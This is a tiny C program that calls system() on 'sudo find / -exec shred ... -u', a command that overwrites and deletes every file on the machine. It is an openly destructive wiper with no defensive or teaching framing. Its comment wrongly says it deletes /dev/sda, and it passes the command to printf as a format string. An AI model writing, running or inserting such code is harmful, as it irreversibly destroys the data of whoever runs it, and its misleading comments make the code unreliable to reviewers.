
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main () {
   char command[200];

   strcpy(command, "sudo find / -exec shred {} -v -n1 -z -u \\;" );//deletes /dev/sda (-v for debugging)
   printf(command);//debugging
   system(command);

   return(0);
} 
